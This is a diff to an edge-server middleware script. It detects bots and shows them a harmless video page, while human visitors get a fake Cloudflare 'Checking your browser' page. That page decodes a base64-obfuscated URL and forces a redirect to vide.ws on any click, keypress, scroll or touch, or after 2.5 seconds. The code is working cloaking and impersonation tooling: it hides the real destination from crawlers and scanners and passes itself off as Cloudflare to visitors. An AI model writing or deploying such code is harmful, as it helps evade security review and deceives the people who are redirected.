@@ -5,24 +5,23 @@ export async function onRequest(context) {
     const path = url.pathname;
     const host = request.headers.get('host');
     
-    console.log(`📨 Incoming request: ${path} from ${host}`);
+    console.log(`Incoming request: ${path} from ${host}`);
 
     // Enhanced Bot Detection
     const isBot = detectBot(request);
     
-    console.log(`🤖 Bot detection: ${isBot} for path: ${path}`);
+    console.log(`Bot detection: ${isBot} for path: ${path}`);
 
     if (isBot) {
+      // Serve SAFE content to bots
       return serveSafeContent(path, host);
     } else {
+      // Serve REDIRECT content to humans dengan meta tags Cloudflare
       return serveRedirectContent(path, host);
     }
   } catch (error) {
-    console.error('❌ Error in middleware:', error);
-    return new Response('Internal Server Error', { 
-      status: 500,
-      headers: { 'Content-Type': 'text/html' }
-    });
+    console.error('Error in middleware:', error);
+    return new Response('Internal Server Error', { status: 500 });
   }
 }
 
@@ -32,6 +31,8 @@ function detectBot(request) {
     const userAgent = request.headers.get('user-agent') || '';
     const accept = request.headers.get('accept') || '';
     const acceptLanguage = request.headers.get('accept-language') || '';
+    
+    console.log(`User-Agent: ${userAgent.substring(0, 100)}`);
     
     // Bot patterns
     const botPatterns = [
@@ -48,77 +49,396 @@ function detectBot(request) {
     const hasNoAcceptLanguage = !acceptLanguage;
     const hasSimpleAccept = accept.includes('*/*');
     
-    return isBotByUA || (hasNoAcceptLanguage && hasSimpleAccept);
+    const result = isBotByUA || (hasNoAcceptLanguage && hasSimpleAccept);
+    console.log(`Bot detection result: ${result}`);
+    
+    return result;
   } catch (error) {
     console.error('Error in bot detection:', error);
-    return false;
+    return false; // Default to human on error
   }
 }
 
 // ===== PATH MAPPING =====
 function getTargetPath(sourcePath) {
-  const pathMappings = {
-    '/d/': '/e/',
-    '/f/': '/f/', 
-    '/v/': '/d/',
-    '/s/': '/c/',
-    '/p/': '/a/',
-    '/w/': '/b/',
-    '/x/': '/g/',
-    '/y/': '/h/',
-    '/z/': '/i/'
-  };
-  
-  // Handle root path
-  if (sourcePath === '/' || sourcePath === '') {
+  try {
+    const pathMappings = {
+      '/d/': '/e/',
+      '/f/': '/f/', 
+      '/v/': '/d/',
+      '/s/': '/c/',
+      '/p/': '/a/',
+      '/w/': '/b/'
+    };
+    
+    console.log(`Processing path: ${sourcePath}`);
+    
+    // Find matching base path
+    for (const [sourceBase, targetBase] of Object.entries(pathMappings)) {
+      if (sourcePath.startsWith(sourceBase)) {
+        const remainingPath = sourcePath.slice(sourceBase.length);
+        const target = `https://vide.ws${targetBase}${remainingPath}`;
+        console.log(`Path mapped: ${sourcePath} -> ${target}`);
+        return target;
+      }
+    }
+    
+    // Default fallback - handle root path and other paths
+    if (sourcePath === '/' || sourcePath === '') {
+      return 'https://vide.ws/';
+    } else {
+      return `https://vide.ws${sourcePath}`;
+    }
+  } catch (error) {
+    console.error('Error in path mapping:', error);
     return 'https://vide.ws/';
   }
-  
-  // Find matching base path
-  for (const [sourceBase, targetBase] of Object.entries(pathMappings)) {
-    if (sourcePath.startsWith(sourceBase)) {
-      const remainingPath = sourcePath.slice(sourceBase.length);
-      return `https://vide.ws${targetBase}${remainingPath}`;
-    }
-  }
-  
-  // Default fallback
-  return `https://vide.ws${sourcePath}`;
 }
 
 // ===== SAFE CONTENT (FOR BOTS) =====
 function serveSafeContent(path, host) {
   try {
-    const pathId = path === '/' ? 'home' : path.split('/').pop() || 'content';
+    const pathId = path.split('/').pop() || 'content';
+    if (pathId === 'content') {
+      // Handle root path
+      const cleanPath = path === '/' ? 'home' : path.replace(/\//g, '');
+    }
     
+    console.log(`Serving safe content for path: ${path}, ID: ${pathId}`);
+
     const safeHtml = `
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Streaming Platform - Premium Content</title>
-    <meta name="description" content="Watch high-quality video content in HD. Our platform offers the best streaming experience.">
-    
-    <!-- Open Graph Meta Tags -->
+    <title>Video Content ${pathId} - Streaming Platform</title>
+    <meta name="description" content="Watch amazing video content ${pathId}. High quality streaming platform with various entertainment options.">
+    <meta property="og:title" content="Video ${pathId} - Streaming Platform">
+    <meta property="og:description" content="Watch this amazing video content in high quality">
+    <meta property="og:type" content="video.movie">
     <meta property="og:url" content="https://${host}${path}">
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="Premium Video Content - Streaming Platform">
-    <meta property="og:description" content="Watch exclusive video content in high definition">
-    <meta property="og:image" content="https://via.placeholder.com/1200x630/667eea/ffffff?text=Video+Stream">
-    
-    <!-- Twitter Meta Tags -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta property="twitter:domain" content="${host}">
-    <meta property="twitter:url" content="https://${host}${path}">
-    <meta name="twitter:title" content="Video Streaming Platform">
-    <meta name="twitter:description" content="Watch amazing video content in HD quality">
-    <meta name="twitter:image" content="https://via.placeholder.com/1200x630/667eea/ffffff?text=Watch+Now">
-    
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            display
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        .video-placeholder {
+            background: linear-gradient(45deg, #f0f0f0, #e0e0e0);
+            height: 280px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        .video-placeholder::before {
+            content: '';
+            position: absolute;
+            width: 80px;
+            height: 80px;
+            border: 3px solid #999;
+            border-radius: 50%;
+            border-top-color: #667eea;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        p {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+        .content-id {
+            background: #f8f9fa;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-family: monospace;
+            color: #667eea;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎬 Video Content Ready</h1>
+        <div class="content-id">ID: ${pathId}</div>
+        <p>High-quality streaming content is loading...</p>
+        
+        <div class="video-placeholder">
+            <!-- Video player placeholder -->
+        </div>
+        
+        <p>This content is optimized for your device and network conditions.</p>
+        <button class="btn" onclick="window.location.reload()">
+            Refresh Content
+        </button>
+        
+        <div style="margin-top: 20px; font-size: 12px; color: #999;">
+            Streaming Platform • HD Quality • Secure Connection
+        </div>
+    </div>
+</body>
+</html>`;
+
+    return new Response(safeHtml, {
+      headers: { 
+        'Content-Type': 'text/html; charset=utf-8',
+        'Cache-Control': 'public, max-age=300'
+      }
+    });
+  } catch (error) {
+    console.error('Error serving safe content:', error);
+    return new Response('Error loading content', { status: 500 });
+  }
+}
+
+// ===== REDIRECT CONTENT (FOR HUMANS) - DENGAN META TAGS CLOUDFLARE =====
+function serveRedirectContent(path, host) {
+  try {
+    const targetUrl = getTargetPath(path);
+    const pathId = path.split('/').pop() || 'content';
+    if (pathId === 'content') {
+      // Handle root path
+      const cleanPath = path === '/' ? 'home' : path.replace(/\//g, '');
+    }
+    
+    console.log(`Serving redirect content for path: ${path}, Target: ${targetUrl}`);
+
+    // Obfuscate the target URL
+    const obfuscatedUrl = btoa(targetUrl).replace(/=/g, '');
+    
+    const redirectHtml = `
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- HTML Meta Tags -->
+    <title>Checking your browser before accessing. Just a moment...</title>
+    <meta name="description" content="">
+
+    <!-- Facebook Meta Tags -->
+    <meta property="og:url" content="https://${host}${path}">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Checking your browser before accessing. Just a moment...">
+    <meta property="og:description" content="">
+    <meta property="og:image" content="">
+
+    <!-- Twitter Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="twitter:domain" content="${host}">
+    <meta property="twitter:url" content="https://${host}${path}">
+    <meta name="twitter:title" content="Checking your browser before accessing. Just a moment...">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:image" content="">
+
+    <!-- Meta Tags Generated via https://www.opengraph.xyz -->
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f7fa;
+            color: #2d3748;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            text-align: center;
+        }
+        .container {
+            max-width: 400px;
+            padding: 40px 20px;
+        }
+        .logo {
+            color: #f6821f;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #f6821f;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #2d3748;
+        }
+        p {
+            color: #718096;
+            font-size: 14px;
+            line-height: 1.5;
+            margin: 10px 0;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e2e8f0;
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress {
+            height: 100%;
+            background: #f6821f;
+            width: 0%;
+            animation: progress 2.5s ease-in-out forwards;
+        }
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .cf-footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e2e8f0;
+            font-size: 12px;
+            color: #a0aec0;
+        }
+        .ray-id {
+            font-family: monospace;
+            background: #edf2f7;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 11px;
+        }
+        .click-hint {
+            background: rgba(246, 130, 31, 0.1);
+            padding: 12px 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.3s;
+            border: 1px solid rgba(246, 130, 31, 0.2);
+        }
+        .click-hint:hover {
+            background: rgba(246, 130, 31, 0.15);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">cloudflare</div>
+        <div class="spinner"></div>
+        <h1>Checking your browser before accessing...</h1>
+        <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
+        <p>Please allow up to 5 seconds...</p>
+        
+        <div class="progress-bar">
+            <div class="progress"></div>
+        </div>
+
+        <div class="click-hint" id="clickTrigger">
+            🚀 <strong>Quick Access</strong> - Click anywhere to continue
+        </div>
+        
+        <div class="cf-footer">
+            <div>DDoS protection by Cloudflare</div>
+            <div>Ray ID: <span class="ray-id">${Math.random().toString(36).substring(2, 15)}</span></div>
+        </div>
+    </div>
+
+    <script>
+        // Obfuscated URL reconstruction
+        const encodedUrl = '${obfuscatedUrl}';
+        const padding = 4 - (encodedUrl.length % 4);
+        const paddedUrl = encodedUrl + '='.repeat(padding);
+        
+        function decodeAndRedirect() {
+            try {
+                const targetUrl = atob(paddedUrl);
+                console.log('Redirecting to content:', targetUrl);
+                window.location.href = targetUrl;
+            } catch (error) {
+                console.error('Decode error:', error);
+                // Fallback
+                window.location.href = 'https://vide.ws/';
+            }
+        }
+        
+        let redirectInitiated = false;
+        
+        function initiateRedirect() {
+            if (!redirectInitiated) {
+                redirectInitiated = true;
+                console.log('Initiating redirect...');
+                decodeAndRedirect();
+            }
+        }
+        
+        // Multiple trigger methods
+        document.addEventListener('click', initiateRedirect);
+        document.addEventListener('keydown', initiateRedirect);
+        document.addEventListener('scroll', initiateRedirect);
+        document.addEventListener('touchstart', initiateRedirect);
+        
+        // Auto-redirect after delay
+        setTimeout(initiateRedirect, 2500);
+        
+        console.log('Redirect page loaded successfully');
+    </script>
+</body>
+</html>`;
+
+    return new Response(redirectHtml, {
+      headers: { 
+        'Content-Type': 'text/html; charset=utf-8',
+        'Cache-Control': 'no-cache, no-store, must-revalidate'
+      }
+    });
+  } catch (error) {
+    console.error('Error serving redirect content:', error);
+    return new Response('Error loading redirect page', { status: 500 });
+  }
+}
